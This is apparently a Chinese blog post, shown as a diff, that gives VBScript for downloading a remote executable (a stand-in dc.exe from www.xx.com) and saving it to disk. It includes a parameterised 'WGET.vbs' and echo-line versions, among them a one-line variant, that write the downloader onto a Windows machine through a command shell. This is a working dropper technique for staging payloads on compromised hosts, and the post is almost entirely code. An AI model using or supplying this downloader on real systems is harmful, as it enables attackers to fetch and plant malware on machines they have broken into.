@@ -1,0 +1,112 @@
+自动下载并运行的VBS脚本代码 .
+
+
+自动下载并运行的VBS脚本代码 
+
+[vb] view plaincopyprint?
+01.Set xPost = createObject("Microsoft.XMLHTTP")   
+02.xPost.Open "GET","http://www.xx.com/dc.exe",0 '下载文件的地址   
+03.xPost.Send()   
+04.Set sGet = createObject("ADODB.Stream")   
+05.sGet.Mode = 3   
+06.sGet.Type = 1   
+07.sGet.Open()   
+08.sGet.Write(xPost.responseBody)   
+09.sGet.SaveToFile "c:/dc.exe",2 '保存文件的路径和文件名  
+Set xPost = createObject("Microsoft.XMLHTTP") 
+xPost.Open "GET","http://www.xx.com/dc.exe",0 '下载文件的地址
+xPost.Send() 
+Set sGet = createObject("ADODB.Stream") 
+sGet.Mode = 3 
+sGet.Type = 1 
+sGet.Open() 
+sGet.Write(xPost.responseBody) 
+sGet.SaveToFile "c:/dc.exe",2 '保存文件的路径和文件名 
+
+把以上代码保存在xx.vbs文件 执行cmd.exe xx.vbs
+
+使用ECHO方法写入
+echo Set xPost = createObject("Microsoft.XMLHTTP") >dc.vbs 
+echo xPost.Open "GET",http://www.xxx.com/dc.exe,0 >>dc.vbs 
+echo xPost.Send() >>dc.vbs 
+echo Set sGet = createObject("ADODB.Stream") >>dc.vbs 
+echo sGet.Mode = 3 >>dc.vbs 
+echo sGet.Type = 1 >>dc.vbs 
+echo sGet.Open() >>dc.vbs 
+echo sGet.Write(xPost.responseBody) >>dc.vbs 
+echo sGet.SaveToFile "c:/dc.exe",2 >>dc.vbs
+
+
+[vb] view plaincopyprint?
+01.===================带参数的WGET.vbs==========  
+02.on error resume next  
+03.iLocal=LCase(Wscript.Arguments(1))  
+04.iRemote=LCase(Wscript.Arguments(0))  
+05.Set xPost=createObject("Microsoft.XMLHTTP")  
+06.xPost.Open "GET",iRemote,0  
+07.xPost.Send()  
+08.set sGet=createObject("ADODB.Stream")  
+09.sGet.Mode=3  
+10.sGet.Type=1  
+11.sGet.Open()  
+12.sGet.Write xPost.ResponseBody  
+13.sGet.SaveToFile iLocal,2  
+14.===================带参数的WGET.vbs==========  
+15.===================带参数的WGET.vbs==========  
+16.echo on  
+17.echo on error resume next >dc.vbs  
+18.echo iLocal=LCase(Wscript.Arguments(1))>>dc.vbs  
+19.echo iRemote=LCase(Wscript.Arguments(0))>>dc.vbs  
+20.echo Set xPost=createObject("Microsoft.XMLHTTP")>>dc.vbs  
+21.echo xPost.Open "GET",iRemote,0>>dc.vbs  
+22.echo xPost.Send()>>dc.vbs  
+23.echo set sGet=createObject("ADODB.Stream")>>dc.vbs  
+24.echo sGet.Mode=3>>dc.vbs  
+25.echo sGet.Type=1>>dc.vbs  
+26.echo sGet.Open()>>dc.vbs  
+27.echo sGet.Write xPost.ResponseBody>>dc.vbs  
+28.echo sGet.SaveToFile iLocal,2>>dc.vbs  
+29.echo off  
+30.pasue  
+31.===================带参数的WGET.vbs==========  
+===================带参数的WGET.vbs==========
+on error resume next
+iLocal=LCase(Wscript.Arguments(1))
+iRemote=LCase(Wscript.Arguments(0))
+Set xPost=createObject("Microsoft.XMLHTTP")
+xPost.Open "GET",iRemote,0
+xPost.Send()
+set sGet=createObject("ADODB.Stream")
+sGet.Mode=3
+sGet.Type=1
+sGet.Open()
+sGet.Write xPost.ResponseBody
+sGet.SaveToFile iLocal,2
+===================带参数的WGET.vbs==========
+===================带参数的WGET.vbs==========
+echo on
+echo on error resume next >dc.vbs
+echo iLocal=LCase(Wscript.Arguments(1))>>dc.vbs
+echo iRemote=LCase(Wscript.Arguments(0))>>dc.vbs
+echo Set xPost=createObject("Microsoft.XMLHTTP")>>dc.vbs
+echo xPost.Open "GET",iRemote,0>>dc.vbs
+echo xPost.Send()>>dc.vbs
+echo set sGet=createObject("ADODB.Stream")>>dc.vbs
+echo sGet.Mode=3>>dc.vbs
+echo sGet.Type=1>>dc.vbs
+echo sGet.Open()>>dc.vbs
+echo sGet.Write xPost.ResponseBody>>dc.vbs
+echo sGet.SaveToFile iLocal,2>>dc.vbs
+echo off
+pasue
+===================带参数的WGET.vbs========== 
+
+1.iget.vbs一次写入 
+在vbs语句的接触是符号是: 所以我们iget.vbs可以这样写 
+
+Set x= createObject("Microsoft.XMLHTTP"):x.Open "GET",LCase(WScript.Arguments(0)),0:x.Send():Set s = createObject("ADODB.Stream"):s.Mode = 3:s.Type = 1:s.Open():s.Write(x.responseBody):s.SaveToFile LCase(WScript.Arguments(1)),2 
+
+这样我们可以一次echo成功,echo版本: 
+
+echo Set x= createObject(^"Microsoft.XMLHTTP^"):x.Open ^"GET^",LCase(WScript.Arguments(0)),0:x.Send():Set s = createObject(^"ADODB.Stream^"):s.Mode = 3:s.Type = 1:s.Open():s.Write(x.responseBody):s.SaveToFile LCase(WScript.Arguments(1)),2 >iget.vbs
+ 
